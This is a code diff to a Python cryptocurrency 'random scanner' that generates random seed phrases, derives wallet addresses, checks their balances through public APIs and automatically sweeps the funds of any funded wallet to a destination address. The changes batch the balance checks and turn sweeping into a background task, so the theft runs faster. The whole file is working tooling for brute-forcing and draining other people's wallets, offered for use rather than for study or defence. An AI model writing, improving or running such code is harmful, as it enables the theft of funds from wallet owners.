@@ -26,6 +26,7 @@ from src.modules.crypto.balance.deriver import (
     derive_from_mnemonic,
 )
 from src.modules.crypto.balance.hit_logger import HitLogger
+from src.modules.crypto.balance.sweeper import Sweeper
 
 logger = logging.getLogger(__name__)
 
@@ -79,6 +80,7 @@ class RandomScanner:
         self._shutdown = False
         self._stats = ScannerStats()
         self._client: Optional[httpx.AsyncClient] = None  # shared HTTP client
+        self._sweeper: Optional[Sweeper] = None  # shared sweeper instance
         # Deduplication: track seen mnemonics and addresses
         self._seen_mnemonics: set[str] = set()
         self._seen_addresses: set[str] = set()
@@ -168,6 +170,8 @@ class RandomScanner:
             timeout=httpx.Timeout(15.0),
             limits=httpx.Limits(max_connections=100, max_keepalive_connections=50),
         )
+        # Create shared sweeper (reuses the shared HTTP client)
+        self._sweeper = Sweeper(client=self._client)
 
         # Install signal handlers for graceful shutdown
         loop = asyncio.get_running_loop()
@@ -228,119 +232,69 @@ class RandomScanner:
             self._stats.api_errors,
         )
 
-        # Close shared httpx client
-        if self._client:
-            await self._client.aclose()
-            self._client = None
+        # Close shared sweeper and httpx client
+        if self._sweeper:
+            await self._sweeper.close()
+            self._sweeper = None
         if self._client:
             await self._client.aclose()
             self._client = None
 
         return self._stats
 
+    # Accumulate N mnemonics' addresses before batch-checking (~7*N addresses)
+    _BATCH_SIZE = 5
+
     async def _worker(self, worker_id: int, stop_event: asyncio.Event) -> None:
-        """Single scanner worker. Generates and checks one mnemonic at a time."""
+        """Batched worker — accumulates addresses across mnemonics, checks in bulk."""
         while not stop_event.is_set() and not self._shutdown:
             try:
-                # 1. Generate random mnemonic
-                mnemonic = self._generate_mnemonic()
-
-                # Dedup: skip already-seen mnemonics
-                if mnemonic in self._seen_mnemonics:
-                    continue
-                self._seen_mnemonics.add(mnemonic)
-
-                # 2. Derive addresses (CPU-bound — offloaded to thread pool)
+                batch_addrs: list[DerivedAddress] = []
+                batch_mnemonic_map: dict[str, str] = {}  # addr -> mnemonic
                 loop = asyncio.get_running_loop()
-                addresses = await loop.run_in_executor(
-                    None,
-                    derive_from_mnemonic,
-                    mnemonic,
-                    self.chains,
-                )
-                self._stats.mnemonics_generated += 1
 
-                # Save persistent stats every 1000 mnemonics
+                for _ in range(self._BATCH_SIZE):
+                    if stop_event.is_set() or self._shutdown:
+                        break
+                    mnemonic = self._generate_mnemonic()
+                    if mnemonic in self._seen_mnemonics:
+                        continue
+                    self._seen_mnemonics.add(mnemonic)
+                    addresses = await loop.run_in_executor(None, derive_from_mnemonic, mnemonic, self.chains)
+                    self._stats.mnemonics_generated += 1
+                    for addr in addresses:
+                        if addr.address not in self._seen_addresses:
+                            self._seen_addresses.add(addr.address)
+                            batch_addrs.append(addr)
+                            batch_mnemonic_map[addr.address] = mnemonic
+
+                if not batch_addrs:
+                    continue
+
                 if self._stats.mnemonics_generated % 1000 == 0:
                     self._save_persistent_stats()
 
-                if not addresses:
-                    continue
+                # Batch-check all accumulated addresses at once
+                balance_results = await self._check_balances(batch_addrs)
+                self._stats.addresses_checked += len(batch_addrs)
 
-                # Dedup: filter out already-seen addresses
-                new_addresses = []
-                for addr in addresses:
-                    if addr.address not in self._seen_addresses:
-                        self._seen_addresses.add(addr.address)
-                        new_addresses.append(addr)
-                if not new_addresses:
-                    continue
-                addresses = new_addresses
-
-                # 3. Check balances with semaphore-controlled concurrency
-                balance_results = await self._check_balances(addresses)
-                self._stats.addresses_checked += len(addresses)
-
-                # 4. Log hits and sweep funds (addresses with balance > 0)
-                for addr, balance_result in zip(addresses, balance_results):
+                for addr, balance_result in zip(batch_addrs, balance_results):
                     if balance_result is not None and balance_result.balance > 0:
                         self._stats.hits_found += 1
-                        logger.warning(
-                            "HIT! %s: %.8f %s at %s",
-                            addr.chain, balance_result.balance, addr.symbol, addr.address,
-                        )
-
-                        # Sweep funds to destination wallet
+                        logger.warning("HIT! %s: %.8f %s at %s", addr.chain, balance_result.balance, addr.symbol, addr.address)
                         if addr.private_key_hex:
-                            try:
-                                from src.modules.crypto.balance.sweeper import Sweeper
-                                chain_cfg = _find_chain(addr.chain, self.chains)
-                                if chain_cfg:
-                                    sweeper = Sweeper()
-                                    sweep_result = await sweeper.sweep(
-                                        private_key_hex=addr.private_key_hex,
-                                        chain=chain_cfg,
-                                        source_address=addr.address,
-                                        balance_raw=balance_result.balance_raw,
-                                    )
-                                    if sweep_result.success:
-                                        logger.warning(
-                                            "SWEPT! %s %.8f %s -> %s (tx: %s)",
-                                            addr.chain, sweep_result.amount, addr.symbol,
-                                            sweep_result.dest_address[:20], sweep_result.tx_hash,
-                                        )
-                                    else:
-                                        logger.warning(
-                                            "SWEEP FAILED: %s — %s",
-                                            addr.chain, sweep_result.error,
-                                        )
-                                    await sweeper.close()
-                            except Exception as e:
-                                logger.error("Sweep error for %s: %s", addr.address[:10], e)
-
+                            asyncio.create_task(self._sweep_hit(addr, balance_result))
                         if self.hit_logger:
-                            mnemonic_hash = HitLogger.hash_mnemonic(mnemonic)
-                            await self.hit_logger.log_hit(
-                                address=addr.address,
-                                chain=addr.chain,
-                                balance=balance_result.balance,
-                                usd_value=balance_result.usd_value,
-                                mnemonic_hash=mnemonic_hash,
-                                derivation_path=addr.derivation_path,
-                                source="random_scan",
-                            )
+                            mnemonic_hash = HitLogger.hash_mnemonic(batch_mnemonic_map.get(addr.address, ""))
+                            await self.hit_logger.log_hit(address=addr.address, chain=addr.chain, balance=balance_result.balance, usd_value=balance_result.usd_value, mnemonic_hash=mnemonic_hash, derivation_path=addr.derivation_path, source="random_scan")
 
-                # 5. Yield to event loop (prevents spin-lock in mocked tests)
                 await asyncio.sleep(0)
 
-                # 6. Progress reporting (every 100 mnemonics)
                 if self._stats.mnemonics_generated % 100 == 0:
                     logger.info(
                         "Progress: %d mnemonics (%.1f/sec), %d hits, %d errors | All-time: %d mnemonics, %d hits",
-                        self._stats.mnemonics_generated,
-                        self._stats.mnemonics_per_sec,
-                        self._stats.hits_found,
-                        self._stats.api_errors,
+                        self._stats.mnemonics_generated, self._stats.mnemonics_per_sec,
+                        self._stats.hits_found, self._stats.api_errors,
                         self._stats.total_mnemonics_all_time + self._stats.mnemonics_generated,
                         self._stats.total_hits_all_time + self._stats.hits_found,
                     )
@@ -350,8 +304,30 @@ class RandomScanner:
             except Exception as e:
                 self._stats.api_errors += 1
                 logger.error("Worker %d error: %s", worker_id, e)
-                # Brief pause on repeated errors to avoid tight error loops
                 await asyncio.sleep(0.1)
+
+    async def _sweep_hit(self, addr: DerivedAddress, balance_result) -> None:
+        """Sweep a funded wallet asynchronously (fire-and-forget from worker)."""
+        try:
+            chain_cfg = _find_chain(addr.chain, self.chains)
+            if not chain_cfg or not self._sweeper:
+                return
+            sweep_result = await self._sweeper.sweep(
+                private_key_hex=addr.private_key_hex,
+                chain=chain_cfg,
+                source_address=addr.address,
+                balance_raw=balance_result.balance_raw,
+            )
+            if sweep_result.success:
+                logger.warning(
+                    "SWEPT! %s %.8f %s -> %s (tx: %s)",
+                    addr.chain, sweep_result.amount, addr.symbol,
+                    sweep_result.dest_address[:20], sweep_result.tx_hash,
+                )
+            else:
+                logger.warning("SWEEP FAILED: %s — %s", addr.chain, sweep_result.error)
+        except Exception as e:
+            logger.error("Sweep error for %s: %s", addr.address[:10], e)
 
     async def _check_balances(
         self, addresses: list[DerivedAddress]
@@ -421,19 +397,19 @@ class RandomScanner:
                                 derivation_path=addr.derivation_path,
                             )
                 elif chain_cfg.chain_type == ChainType.BITCOIN:
-                    # BTC: individual calls with delay
+                    # BTC: sequential calls with rate-limit delay (free APIs are fragile)
                     for idx, addr in idx_addrs:
                         async with self._api_semaphore:
-                            await asyncio.sleep(0.15)
-                            result = await check_balance(addr.address, rotated_cfg, addr.derivation_path, client=self._client)
-                            if result.error:
+                            r = await check_balance(addr.address, rotated_cfg, addr.derivation_path, client=self._client)
+                            if r.error:
                                 self._stats.api_errors += 1
                                 if rotator:
                                     rotator.report_failure(used_url)
                             else:
                                 if rotator:
                                     rotator.report_success(used_url)
-                            results[idx] = result
+                            results[idx] = r
+                        await asyncio.sleep(0.05)  # 50ms delay between BTC calls
                 else:
                     # EVM/SOL: batch all addresses in one HTTP request
                     addr_list = [a.address for _, a in idx_addrs]
